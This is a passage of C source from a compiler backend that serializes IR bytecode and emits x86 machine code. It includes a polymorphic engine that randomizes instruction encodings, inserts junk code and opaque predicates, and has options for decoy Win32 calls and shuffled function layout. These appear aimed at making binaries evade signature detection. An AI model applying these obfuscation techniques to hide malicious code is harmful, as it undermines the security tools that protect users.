                    ins->src1 = bc_read_value(r);
                    ins->arg_count = bc_read_u8(r);
                    ins->args = (struct Operand*)malloc(sizeof(struct Operand) * ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++) {
                        ins->args[a] = bc_read_value(r);
                    }
                } else if (opcode == OP_FUNC_ADDR) {
                    ins->dest = bc_read_value(r);
                    ins->func_idx = bc_read_u16(r);
                } else if (opcode == OP_SYSCALL) {
                    ins->dest = bc_read_value(r);
                    ins->arg_count = 6;
                    ins->args = (struct Operand*)malloc(sizeof(struct Operand) * 6);
                    for (int a = 0; a < 6; a++) {
                        ins->args[a] = bc_read_value(r);
                    }
                } else if (opcode == OP_RET) {
                    ins->src1 = bc_read_value(r);
                } else if (opcode == OP_RETV) {
                    // No operands
                } else if (opcode == OP_EMIT) {
                    int count = bc_read_u8(r);
                    ins->raw_count = count;
                    ins->raw_bytes = (unsigned char*)malloc(count ? count : 1);
                    for (int rk = 0; rk < count; rk++) ins->raw_bytes[rk] = bc_read_u8(r);
                    // OP_EMIT has no dest operand — use VK_CONST to avoid compact_temps mishandling
                    ins->dest.kind = 4; // VK_CONST
                }
            }
        }
    }

    // Assign api_slot: known names get fixed slots (for PE wrapper builder),
    // other externs get sequential slots starting after the known names.
    {
        int user_slot = 8;
        for (int i = 0; i < func_count; i++) {
            if (mod->funcs[i].block_count > 0) { mod->funcs[i].api_slot = i; continue; }
            int slot = -1;
            if (strcmp(mod->funcs[i].name, "malloc") == 0)        slot = 0;
            else if (strcmp(mod->funcs[i].name, "free") == 0)     slot = 1;
            else if (strcmp(mod->funcs[i].name, "read") == 0)     slot = 2;
            else if (strcmp(mod->funcs[i].name, "write") == 0)    slot = 3;
            else if (strcmp(mod->funcs[i].name, "open") == 0)     slot = 4;
            else if (strcmp(mod->funcs[i].name, "close") == 0)    slot = 5;
            else if (strcmp(mod->funcs[i].name, "exit") == 0)     slot = 6;
            mod->funcs[i].api_slot = slot >= 0 ? slot : user_slot++;
        }
    }

    return mod;
}

// =============================================================================
// Bytecode Writer (serialize IR back to .mcb format)
// =============================================================================

int find_string_idx(struct Module* mod, char* s) {
    for (int i = 0; i < mod->string_count; i++) {
        if (mod->strings[i] == s) return i;
    }
    return 0;
}

void bc_write_operand(struct Buffer* buf, struct Operand* op) {
    buf_write_u8(buf, op->kind);
    if (op->kind == VK_CONST) {
        buf_write_u32(buf, op->value);
    } else {
        buf_write_u16(buf, op->index);
    }
}

void emit_bytecode(struct Module* mod, const char* filename, int verbose) {
    struct Buffer* buf = buf_new(65536);
    struct Buffer* strbuf = buf_new(4096);
    int* str_offsets = (int*)malloc(mod->string_count * sizeof(int));

    // Header
    buf_write_u32(buf, 0x4E42434D);  // MC_MAGIC
    buf_write_u16(buf, 1);
    buf_write_u8(buf, 1);
    buf_write_u8(buf, 0);
    buf_write_u16(buf, mod->string_count);
    buf_write_u16(buf, 0);  // no structs
    buf_write_u16(buf, mod->global_count);
    buf_write_u16(buf, mod->func_count);

    // String table
    for (int i = 0; i < mod->string_count; i++) {
        str_offsets[i] = strbuf->len;
        int slen = (int)strlen(mod->strings[i]);
        buf_write_bytes(strbuf, (unsigned char*)mod->strings[i], slen);
        buf_write_u8(strbuf, 0);
    }
    buf_write_u32(buf, strbuf->len);
    for (int i = 0; i < mod->string_count; i++) {
        buf_write_u32(buf, str_offsets[i]);
    }
    buf_write_bytes(buf, strbuf->data, strbuf->len);
    free(str_offsets);
    free(strbuf->data);
    free(strbuf);

    // Globals
    for (int i = 0; i < mod->global_count; i++) {
        buf_write_u16(buf, mod->globals[i].name_idx);
        buf_write_u8(buf, mod->globals[i].type_code);
        buf_write_u8(buf, mod->globals[i].init_kind);
        buf_write_u32(buf, mod->globals[i].init_value);
    }

    // Functions
    for (int i = 0; i < mod->func_count; i++) {
        struct Function* f = &mod->funcs[i];
        buf_write_u16(buf, f->name_idx);
        buf_write_u8(buf, f->return_type);
        buf_write_u8(buf, f->param_count);
        buf_write_u8(buf, f->local_count);
        buf_write_u16(buf, f->block_count);
        buf_write_u16(buf, f->temp_count);
        buf_write_u16(buf, f->dll_idx);

        for (int j = 0; j < f->param_count; j++)
            buf_write_u8(buf, f->param_types[j]);

        for (int j = 0; j < f->local_count; j++) {
            buf_write_u8(buf, f->local_types[j]);
            buf_write_u16(buf, f->local_sizes[j]);
        }

        for (int b = 0; b < f->block_count; b++) {
            struct Block* blk = &f->blocks[b];
            buf_write_u16(buf, find_string_idx(mod, blk->label));
            buf_write_u16(buf, blk->instr_count);

            for (int k = 0; k < blk->instr_count; k++) {
                struct Instruction* ins = &blk->instrs[k];
                int op = ins->opcode;
                buf_write_u8(buf, op);

                if (op == OP_NOP) {
                    // no operands
                } else if (op == OP_CONST) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u32(buf, ins->src1.value);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_COPY || op == OP_NEG || op == OP_NOT) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op >= OP_ADD && op <= OP_GE) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    bc_write_operand(buf, &ins->src2);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_LOAD) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_STORE) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->type_code);
                } else if (op == OP_ADDR) {
                    bc_write_operand(buf, &ins->dest);
                    if (ins->src1.kind == VK_GLOBAL) {
                        buf_write_u8(buf, 1);
                        buf_write_u8(buf, ins->src1.index & 255);
                        buf_write_u8(buf, (ins->src1.index >> 8) & 255);
                    } else {
                        buf_write_u8(buf, 0);
                        buf_write_u8(buf, ins->src1.index & 255);
                    }
                } else if (op == OP_PTRADD) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    bc_write_operand(buf, &ins->src2);
                    buf_write_u16(buf, ins->elem_size);
                } else if (op == OP_FIELDPTR) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u16(buf, ins->offset);
                } else if (op == OP_ALLOCA) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->offset);
                    buf_write_u8(buf, ins->elem_size);
                } else if (op == OP_JMP) {
                    buf_write_u16(buf, ins->target_block);
                } else if (op == OP_JZ || op == OP_JNZ) {
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u16(buf, ins->target_block);
                } else if (op == OP_CALL) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->func_idx);
                    buf_write_u8(buf, ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++)
                        bc_write_operand(buf, &ins->args[a]);
                } else if (op == OP_CALLV) {
                    buf_write_u16(buf, ins->func_idx);
                    buf_write_u8(buf, ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++)
                        bc_write_operand(buf, &ins->args[a]);
                } else if (op == OP_ICALL) {
                    bc_write_operand(buf, &ins->dest);
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++)
                        bc_write_operand(buf, &ins->args[a]);
                } else if (op == OP_ICALLV) {
                    bc_write_operand(buf, &ins->src1);
                    buf_write_u8(buf, ins->arg_count);
                    for (int a = 0; a < ins->arg_count; a++)
                        bc_write_operand(buf, &ins->args[a]);
                } else if (op == OP_FUNC_ADDR) {
                    bc_write_operand(buf, &ins->dest);
                    buf_write_u16(buf, ins->func_idx);
                } else if (op == OP_SYSCALL) {
                    bc_write_operand(buf, &ins->dest);
                    for (int a = 0; a < 6; a++)
                        bc_write_operand(buf, &ins->args[a]);
                } else if (op == OP_RET) {
                    bc_write_operand(buf, &ins->src1);
                } else if (op == OP_RETV) {
                    // no operands
                } else if (op == OP_EMIT) {
                    buf_write_u8(buf, ins->raw_count);
                    for (int rk = 0; rk < ins->raw_count; rk++) buf_write_u8(buf, ins->raw_bytes[rk]);
                }
            }
        }
    }

    // Write to file
    FILE* out = fopen(filename, "wb");
    if (!out) {
        fprintf(stderr, "Cannot create bytecode file: %s\n", filename);
        free(buf->data);
        free(buf);
        return;
    }
    fwrite(buf->data, 1, buf->len, out);
    fclose(out);

    fprintf(stderr, "IR bytecode: %s (%d bytes)\n", filename, buf->len);

    free(buf->data);
    free(buf);
}

// =============================================================================
//
// x86 Module
//
// Contains the following sections:
//   1. x86 encoder (emit_mov_*, emit_add_*, modrm, etc.)
//   2. Polymorphic code generation (variant emitters, dead code, opaque)
//
// =============================================================================

// =============================================================================
// x86 Encoder
// =============================================================================

void emit_byte(struct Buffer* b, int byte) {
    buf_write_u8(b, byte);
}

void emit_u16(struct Buffer* b, int val) {
    buf_write_u16(b, val);
}

void emit_u32(struct Buffer* b, int val) {
    buf_write_u32(b, val);
}

// ModR/M byte
int modrm(int mod, int reg, int rm) {
    return ((mod & 3) << 6) | ((reg & 7) << 3) | (rm & 7);
}

// MOV r32, r32
void emit_mov_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x89);
    emit_byte(b, modrm(3, src, dst));
}

// MOV r32, imm32
void emit_mov_ri(struct Buffer* b, int dst, int imm) {
    emit_byte(b, 0xB8 + dst);
    emit_u32(b, imm);
}

// MOV r32, [r32]
void emit_mov_rm(struct Buffer* b, int dst, int base) {
    emit_byte(b, 0x8B);
    emit_byte(b, modrm(0, dst, base));
}

// MOVZX r32, byte ptr [r32] (zero-extend byte to dword)
void emit_movzx_rm_byte(struct Buffer* b, int dst, int base) {
    emit_byte(b, 0x0F);
    emit_byte(b, 0xB6);  // MOVZX r32, r/m8
    emit_byte(b, modrm(0, dst, base));
}

// MOV r32, [r32 + disp32]
void emit_mov_rm_disp(struct Buffer* b, int dst, int base, int disp) {
    emit_byte(b, 0x8B);
    if (base == REG_ESP) {
        // ESP requires SIB byte
        emit_byte(b, modrm(2, dst, 4));  // r/m=100 means SIB follows
        emit_byte(b, 0x24);  // SIB: scale=0, index=100 (none), base=100 (ESP)
    } else {
        emit_byte(b, modrm(2, dst, base));
    }
    emit_u32(b, disp);
}

// MOV [r32], r32
void emit_mov_mr(struct Buffer* b, int base, int src) {
    emit_byte(b, 0x89);
    emit_byte(b, modrm(0, src, base));
}

// MOV byte ptr [r32], r8 (only AL, CL, DL, BL for r8)
void emit_mov_mr_byte(struct Buffer* b, int base, int src) {
    emit_byte(b, 0x88);  // MOV r/m8, r8
    emit_byte(b, modrm(0, src, base));
}

// MOV [r32 + disp32], r32
void emit_mov_mr_disp(struct Buffer* b, int base, int disp, int src) {
    emit_byte(b, 0x89);
    emit_byte(b, modrm(2, src, base));
    emit_u32(b, disp);
}

// MOV byte ptr [r32 + disp32], r8
void emit_mov_mr_disp_byte(struct Buffer* b, int base, int disp, int src) {
    emit_byte(b, 0x88);
    emit_byte(b, modrm(2, src, base));
    emit_u32(b, disp);
}

// ADD r32, r32
void emit_add_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x01);
    emit_byte(b, modrm(3, src, dst));
}

// ADD r32, imm32
void emit_add_ri(struct Buffer* b, int dst, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 0, dst));
    emit_u32(b, imm);
}

// SUB r32, r32
void emit_sub_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x29);
    emit_byte(b, modrm(3, src, dst));
}

// SUB r32, imm32
void emit_sub_ri(struct Buffer* b, int dst, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 5, dst));
    emit_u32(b, imm);
}

// IMUL r32, r32
void emit_imul_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x0F);
    emit_byte(b, 0xAF);
    emit_byte(b, modrm(3, dst, src));
}

// PUSH r32
void emit_push(struct Buffer* b, int reg) {
    emit_byte(b, 0x50 + reg);
}

// POP r32
void emit_pop(struct Buffer* b, int reg) {
    emit_byte(b, 0x58 + reg);
}

// RET
void emit_ret(struct Buffer* b) {
    emit_byte(b, 0xC3);
}

// CALL rel32
void emit_call_rel(struct Buffer* b, int rel) {
    emit_byte(b, 0xE8);
    emit_u32(b, rel);
}

// JMP rel32
void emit_jmp_rel(struct Buffer* b, int rel) {
    emit_byte(b, 0xE9);
    emit_u32(b, rel);
}

// Jcc rel8 (short conditional)
void emit_jcc_short(struct Buffer* b, int cc, int rel) {
    emit_byte(b, 0x70 + cc);
    emit_byte(b, rel);
}

// Jcc rel32
void emit_jcc_rel(struct Buffer* b, int cc, int rel) {
    emit_byte(b, 0x0F);
    emit_byte(b, 0x80 + cc);
    emit_u32(b, rel);
}

// CMP r32, r32
void emit_cmp_rr(struct Buffer* b, int r1, int r2) {
    emit_byte(b, 0x39);
    emit_byte(b, modrm(3, r2, r1));
}

// CMP r32, imm32
void emit_cmp_ri(struct Buffer* b, int reg, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 7, reg));
    emit_u32(b, imm);
}

// TEST r32, r32
void emit_test_rr(struct Buffer* b, int r1, int r2) {
    emit_byte(b, 0x85);
    emit_byte(b, modrm(3, r2, r1));
}

// XOR r32, r32
void emit_xor_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x31);
    emit_byte(b, modrm(3, src, dst));
}

// AND r32, r32
void emit_and_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x21);
    emit_byte(b, modrm(3, src, dst));
}

// OR r32, r32
void emit_or_rr(struct Buffer* b, int dst, int src) {
    emit_byte(b, 0x09);
    emit_byte(b, modrm(3, src, dst));
}

// NEG r32
void emit_neg(struct Buffer* b, int reg) {
    emit_byte(b, 0xF7);
    emit_byte(b, modrm(3, 3, reg));
}

// NOT r32
void emit_not(struct Buffer* b, int reg) {
    emit_byte(b, 0xF7);
    emit_byte(b, modrm(3, 2, reg));
}

// SHL r32, CL
void emit_shl_cl(struct Buffer* b, int reg) {
    emit_byte(b, 0xD3);
    emit_byte(b, modrm(3, 4, reg));
}

// SHR r32, CL
void emit_shr_cl(struct Buffer* b, int reg) {
    emit_byte(b, 0xD3);
    emit_byte(b, modrm(3, 5, reg));
}

// CDQ (sign-extend EAX to EDX:EAX)
void emit_cdq(struct Buffer* b) {
    emit_byte(b, 0x99);
}

// IDIV r32
void emit_idiv(struct Buffer* b, int reg) {
    emit_byte(b, 0xF7);
    emit_byte(b, modrm(3, 7, reg));
}

// INC r32
void emit_inc(struct Buffer* b, int reg) {
    emit_byte(b, 0x40 + reg);
}

// DEC r32
void emit_dec(struct Buffer* b, int reg) {
    emit_byte(b, 0x48 + reg);
}

// LEA dst, [base + index] (SIB-based)
void emit_lea_rr(struct Buffer* b, int dst, int base, int index) {
    emit_byte(b, 0x8D);
    emit_byte(b, modrm(0, dst, 4));  // r/m=100 means SIB
    emit_byte(b, (index << 3) | base);  // SIB: scale=0, index, base
}

// LEA dst, [base + disp32]
void emit_lea_rd(struct Buffer* b, int dst, int base, int disp) {
    emit_byte(b, 0x8D);
    emit_byte(b, modrm(2, dst, base));
    emit_u32(b, disp);
}

// PUSH imm32
void emit_push_i(struct Buffer* b, int imm) {
    emit_byte(b, 0x68);
    emit_u32(b, imm);
}

// OR r32, imm32
void emit_or_ri(struct Buffer* b, int reg, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 1, reg));
    emit_u32(b, imm);
}

// AND r32, imm32
void emit_and_ri(struct Buffer* b, int reg, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 4, reg));
    emit_u32(b, imm);
}

// XOR r32, imm32
void emit_xor_ri(struct Buffer* b, int reg, int imm) {
    emit_byte(b, 0x81);
    emit_byte(b, modrm(3, 6, reg));
    emit_u32(b, imm);
}

// Jcc placeholder: emit 0F 8x + 4-byte zero, return offset of the rel32
int emit_jcc_placeholder(struct Buffer* b, int cc) {
    emit_byte(b, 0x0F);
    emit_byte(b, 0x80 + cc);
    int offset = b->len;
    emit_u32(b, 0);
    return offset;
}

// Fixup rel32 at given offset to jump to target
void emit_fixup_rel32(struct Buffer* b, int offset, int target) {
    int rel = target - (offset + 4);
    b->data[offset] = rel & 0xFF;
    b->data[offset + 1] = (rel >> 8) & 0xFF;
    b->data[offset + 2] = (rel >> 16) & 0xFF;
    b->data[offset + 3] = (rel >> 24) & 0xFF;
}

// =============================================================================
// Polymorphic Code Generation
// =============================================================================

// --- ADD variants ---

void emit_add_v0(struct Buffer* b, int dst, int src1, int src2) {
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_add_rr(b, dst, src2);
}

void emit_add_v1(struct Buffer* b, int dst, int src1, int src2) {
    emit_lea_rr(b, dst, src1, src2);
}

void emit_add_v2(struct Buffer* b, int dst, int src1, int src2, int scratch) {
    emit_mov_rr(b, scratch, src2);
    emit_neg(b, scratch);
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_sub_rr(b, dst, scratch);
}

void emit_add_v3(struct Buffer* b, int dst, int src1, int src2) {
    emit_push(b, src1);
    emit_byte(b, 0x01);
    emit_byte(b, 0x04 | (src2 << 3));
    emit_byte(b, 0x24);
    emit_pop(b, dst);
}

void emit_add_v4(struct Buffer* b, int dst, int src1, int src2, int scratch) {
    emit_mov_rr(b, scratch, src1);
    emit_and_rr(b, scratch, src2);
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_xor_rr(b, dst, src2);
    emit_add_rr(b, scratch, scratch);
    emit_add_rr(b, dst, scratch);
}

void emit_add_poly(struct Buffer* b, int dst, int src1, int src2, int scratch, struct Prng* prng) {
    int variant = genome_pick(get_genome()->add_weights, 5, prng);
    if (variant == 0) {
        emit_add_v0(b, dst, src1, src2);
    } else if (variant == 1) {
        emit_add_v1(b, dst, src1, src2);
    } else if (variant == 2) {
        emit_add_v2(b, dst, src1, src2, scratch);
    } else if (variant == 3) {
        emit_add_v3(b, dst, src1, src2);
    } else {
        emit_add_v4(b, dst, src1, src2, scratch);
    }
}

// --- SUB variants ---

void emit_sub_v0(struct Buffer* b, int dst, int src1, int src2) {
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_sub_rr(b, dst, src2);
}

void emit_sub_v1(struct Buffer* b, int dst, int src1, int src2, int scratch) {
    emit_mov_rr(b, scratch, src2);
    emit_neg(b, scratch);
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_add_rr(b, dst, scratch);
}

void emit_sub_v2(struct Buffer* b, int dst, int src1, int src2) {
    emit_push(b, src1);
    emit_byte(b, 0x29);
    emit_byte(b, 0x04 | (src2 << 3));
    emit_byte(b, 0x24);
    emit_pop(b, dst);
}

void emit_sub_v3(struct Buffer* b, int dst, int src1, int src2, int scratch) {
    emit_mov_rr(b, scratch, src2);
    emit_not(b, scratch);
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_add_rr(b, dst, scratch);
    emit_inc(b, dst);
}

void emit_sub_poly(struct Buffer* b, int dst, int src1, int src2, int scratch, struct Prng* prng) {
    int variant = genome_pick(get_genome()->sub_weights, 4, prng);
    if (variant == 0) {
        emit_sub_v0(b, dst, src1, src2);
    } else if (variant == 1) {
        emit_sub_v1(b, dst, src1, src2, scratch);
    } else if (variant == 2) {
        emit_sub_v2(b, dst, src1, src2);
    } else {
        emit_sub_v3(b, dst, src1, src2, scratch);
    }
}

// --- MOV immediate variants ---

void emit_movi_v0(struct Buffer* b, int dst, int imm) {
    emit_mov_ri(b, dst, imm);
}

void emit_movi_v1(struct Buffer* b, int dst, int imm) {
    emit_xor_rr(b, dst, dst);
    if (imm != 0) emit_add_ri(b, dst, imm);
}

void emit_movi_v2(struct Buffer* b, int dst, int imm) {
    emit_push_i(b, imm);
    emit_pop(b, dst);
}

void emit_movi_v3(struct Buffer* b, int dst, int imm) {
    emit_xor_rr(b, dst, dst);
    if (imm != 0) emit_lea_rd(b, dst, dst, imm);
}

void emit_movi_v4(struct Buffer* b, int dst, int imm) {
    emit_mov_ri(b, dst, ~imm);
    emit_not(b, dst);
}

void emit_movi_v5(struct Buffer* b, int dst, int imm) {
    emit_xor_rr(b, dst, dst);
    emit_sub_ri(b, dst, 0 - imm);
}

void emit_movi_poly(struct Buffer* b, int dst, int imm, struct Prng* prng) {
    int variant;
    if (imm == 0) {
        variant = genome_pick(get_genome()->movi_zero_weights, 3, prng);
        if (variant == 0) {
            emit_xor_rr(b, dst, dst);
        } else if (variant == 1) {
            emit_sub_rr(b, dst, dst);
        } else {
            emit_mov_ri(b, dst, 0);
        }
        return;
    }
    if (imm == -1) {
        variant = genome_pick(get_genome()->movi_neg1_weights, 3, prng);
        if (variant == 0) {
            emit_xor_rr(b, dst, dst);
            emit_dec(b, dst);
        } else if (variant == 1) {
            emit_xor_rr(b, dst, dst);
            emit_not(b, dst);
        } else {
            emit_mov_ri(b, dst, -1);
        }
        return;
    }
    variant = genome_pick(get_genome()->movi_weights, 6, prng);
    if (variant == 0) {
        emit_movi_v0(b, dst, imm);
    } else if (variant == 1) {
        emit_movi_v1(b, dst, imm);
    } else if (variant == 2) {
        emit_movi_v2(b, dst, imm);
    } else if (variant == 3) {
        emit_movi_v3(b, dst, imm);
    } else if (variant == 4) {
        emit_movi_v4(b, dst, imm);
    } else {
        emit_movi_v5(b, dst, imm);
    }
}

// --- XOR variants ---

void emit_xor_v0(struct Buffer* b, int dst, int src1, int src2) {
    if (dst != src1) emit_mov_rr(b, dst, src1);
    emit_xor_rr(b, dst, src2);
}

void emit_xor_v1(struct Buffer* b, int dst, int src1, int src2) {
    emit_push(b, src1);
    emit_byte(b, 0x31);
    emit_byte(b, 0x04 | (src2 << 3));
    emit_byte(b, 0x24);
    emit_pop(b, dst);
}

void emit_xor_v2(struct Buffer* b, int dst, int src1, int src2, int s1, int s2) {
    emit_mov_rr(b, s1, src1);
    emit_or_rr(b, s1, src2);
    emit_mov_rr(b, s2, src1);
    emit_and_rr(b, s2, src2);
    emit_not(b, s2);
    emit_mov_rr(b, dst, s1);
    emit_and_rr(b, dst, s2);
}

void emit_xor_poly(struct Buffer* b, int dst, int src1, int src2, int s1, int s2, struct Prng* prng) {
    int variant = genome_pick(get_genome()->xor_weights, 3, prng);
    if (variant == 0) {
        emit_xor_v0(b, dst, src1, src2);
    } else if (variant == 1) {
        emit_xor_v1(b, dst, src1, src2);
    } else {
        emit_xor_v2(b, dst, src1, src2, s1, s2);
    }
}

// --- CMP variants ---

void emit_cmp_poly(struct Buffer* b, int r1, int r2, int scratch, struct Prng* prng) {
    int variant = genome_pick(get_genome()->cmp_weights, 2, prng);
    if (variant == 0) {
        emit_cmp_rr(b, r1, r2);
    } else {
        emit_mov_rr(b, scratch, r1);
        emit_sub_rr(b, scratch, r2);
    }
}

// --- Dead code insertion ---

// Forward declaration: RA-aware version defined after CodeGen struct
struct CodeGen;
int pick_free_reg_cg(struct CodeGen* cg);
int pick_free_reg(struct Prng* prng) {
    if (g_junk_ra_alloc) {
        int free_regs[8];
        int nfree = 0;
        for (int i = 0; i < g_junk_ra_num_regs; i++) {
            int r = g_junk_ra_reg_order[i];
            if (g_junk_ra_alloc[r] < 0) free_regs[nfree++] = r;
        }
        if (nfree == 0) return REG_EAX; // fallback, shouldn't happen
        return free_regs[prng_range(prng, nfree)];
    }
    int free_regs[] = {REG_EAX, REG_ECX, REG_EDX, REG_ESI, REG_EDI};
    return free_regs[prng_range(prng, 5)];
}

int pick_any_reg(struct Prng* prng) {
    return prng_range(prng, 8);
}

// Emit one specific junk pattern. Factored out so callers that need to pick
// the pattern themselves (e.g. emit_harmless_junk, which skips pattern 3)
// can do so without duplicating the body.
void emit_junk_pattern(struct Buffer* b, struct Prng* prng, int pattern) {
    g_last_dead_pattern = pattern;
    int free1 = pick_free_reg(prng);
    int free2 = pick_free_reg(prng);
    int any1 = pick_any_reg(prng);
    int any2 = pick_any_reg(prng);
    int imm = prng_range(prng, 256) + 1;

    if (pattern == 0) {
        // MOV free, any; ADD free, imm — address calculation
        emit_mov_rr(b, free1, any1);
        emit_add_ri(b, free1, imm);
    } else if (pattern == 1) {
        // MOV free, any; XOR free, imm; ADD free, any2 — hash computation
        emit_mov_rr(b, free1, any1);
        emit_xor_ri(b, free1, imm);
        emit_add_rr(b, free1, any2);
    } else if (pattern == 2) {
        // LEA free, [any + imm] — pointer arithmetic
        if (any1 != REG_ESP) {
            emit_lea_rd(b, free1, any1, imm);
        } else {
            emit_lea_rd(b, free1, REG_EAX, imm);
        }
    } else if (pattern == 3) {
        // PUSH any; MOV any, imm; OP any, imm; POP any — save/compute/restore
        if (any1 == REG_ESP || any1 == REG_EBP) any1 = REG_EAX;
        emit_push(b, any1);
        emit_mov_ri(b, any1, imm);
        emit_add_ri(b, any1, prng_range(prng, 100) + 1);
        emit_pop(b, any1);
    } else if (pattern == 4) {
        // IMUL free, any; ADD free, imm — multiply-accumulate
        if (any1 == REG_ESP) any1 = REG_ECX;
        emit_mov_rr(b, free1, any1);
        emit_imul_rr(b, free1, any1);
        emit_add_ri(b, free1, imm);
    } else if (pattern == 5) {
        // MOV free, imm; CMP free, any; Jcc+MOV — comparison+conditional set
        emit_mov_ri(b, free1, imm);
        if (any1 == REG_ESP) any1 = REG_ECX;
        emit_cmp_rr(b, free1, any1);
        emit_mov_ri(b, free1, 0);
        emit_jcc_short(b, prng_range(prng, 16), 5);
        emit_mov_ri(b, free1, 1);
    } else if (pattern == 6) {
        // XOR free, free; ADD free, any; SUB free, imm — zero+accumulate
        emit_xor_rr(b, free1, free1);
        emit_add_rr(b, free1, any1);
        emit_sub_ri(b, free1, imm);
    } else {
        // MOV free, [EBP - random_offset]; ADD free, imm — stack variable read
        int offset = (prng_range(prng, 8) + 1) * 4;
        emit_mov_rm_disp(b, free1, REG_EBP, -offset);
        emit_add_ri(b, free1, imm);
    }
}

// Random pick + emit. Existing call sites use this.
void emit_junk_sequence(struct Buffer* b, struct Prng* prng) {
    int pattern = genome_pick(get_genome()->junk_seq_weights, 8, prng);
    emit_junk_pattern(b, prng, pattern);
}

void insert_dead_code(struct Buffer* b, struct Prng* prng, int max_bytes) {
    int bytes_used = 0;
    while (bytes_used < max_bytes) {
        emit_junk_sequence(b, prng);
        bytes_used += 8;
    }
}

// --- Opaque predicates ---

int emit_opaque_true(struct Buffer* b, int s1, int s2, struct Prng* prng) {
    int variant = genome_pick(get_genome()->opaque_weights, 3, prng);
    g_last_opaque_form = variant;
    int jump_offset;
    if (variant == 0) {
        int x = prng_range(prng, 1000);
        emit_mov_ri(b, s1, x);
        emit_mov_rr(b, s2, s1);
        emit_inc(b, s2);
        emit_imul_rr(b, s1, s2);
        emit_and_ri(b, s1, 1);
        emit_test_rr(b, s1, s1);
        jump_offset = emit_jcc_placeholder(b, CC_E);
    } else if (variant == 1) {
        int x = prng_range(prng, 100) - 50;
        emit_mov_ri(b, s1, x);
        emit_imul_rr(b, s1, s1);
        emit_cmp_ri(b, s1, 0);
        jump_offset = emit_jcc_placeholder(b, CC_GE);
    } else {
        int x = prng_range(prng, 1000);
        emit_mov_ri(b, s1, x);
        emit_or_ri(b, s1, 1);
        emit_test_rr(b, s1, s1);
        jump_offset = emit_jcc_placeholder(b, CC_NE);
    }
    return jump_offset;
}

void insert_opaque_block(struct Buffer* b, int s1, int s2, struct Prng* prng) {
    int jump_offset = emit_opaque_true(b, s1, s2, prng);
    int dead_size = prng_range(prng, 8) + 4;
    insert_dead_code(b, prng, dead_size);
    emit_fixup_rel32(b, jump_offset, b->len);
}

void maybe_insert_dead(struct Buffer* b, struct Prng* prng, int probability) {
    if (prng_range(prng, 100) < probability) {
        int size = prng_range(prng, 6) + 1;
        insert_dead_code(b, prng, size);
    }
}

void maybe_insert_opaque(struct Buffer* b, int s1, int s2, struct Prng* prng, int probability) {
    if (prng_range(prng, 100) < probability) {
        insert_opaque_block(b, s1, s2, prng);
    }
}

// =============================================================================
//
// Code Generator Module
//
// Contains the following sections:
//   1. Codegen state + module/function generation
//   2. Register allocator (greedy instruction-level, 6/5 regs)
//
// =============================================================================

// =============================================================================
// Code Generator
// =============================================================================

struct X86Config {
    int poly_instrs;      // --x86-poly-instrs: register shuffle + poly instruction encoding
    int dead_code;        // --x86-dead-code: dead byte sequences between blocks/instructions
    int opaque;           // --x86-opaque: opaque predicate blocks at block boundaries
    int junk_funcs;       // --x86-junk-funcs: junk function generation + junk calls
    int harmless_calls;   // --x86-harmless-calls: harmless Win32 API calls
    int shuffle_funcs;    // --x86-shuffle-funcs: shuffle real+junk function layout in binary
};

struct CodeGen {
    struct Module* mod;
    struct Prng* prng;
    struct Buffer* code;
    struct Buffer* data;
    int* func_offsets;
    int* block_offsets;
    int* temp_spill;
    int stack_size;
    int pic_mode;
    int abs_mode;  // 0=off, 1=PE (absolute+IAT), 2=ELF (absolute+syscall wrappers)
    struct X86Config x86;
    int api_slot_offset;  // Offset in code where API table pointer is stored (PIC mode)
    int entry_func_idx;   // Index of entry function
    struct Function* current_func;  // Currently generating function
    // Fixups for forward jumps
    int* fixup_offsets;   // Position in code to patch
    int* fixup_targets;   // Target block index
    int* fixup_sizes;     // Size of the jump instruction (5 for jmp, 6 for jcc)
    int fixup_count;
    int fixup_cap;
    // String offsets in data section
    int* string_offsets;  // Offset of each string in data section
    // Global variable offsets in data section
    int* global_offsets;  // Offset of each global in data section
    // String reference fixups (for PIC mode)
    int* str_fixup_offsets;  // Position in code to patch
    int* str_fixup_indices;  // String index being referenced
    int* str_fixup_bases;    // Base offset (position of instruction after call/pop)
    int str_fixup_count;
    int str_fixup_cap;
    // Global reference fixups (for PIC mode)
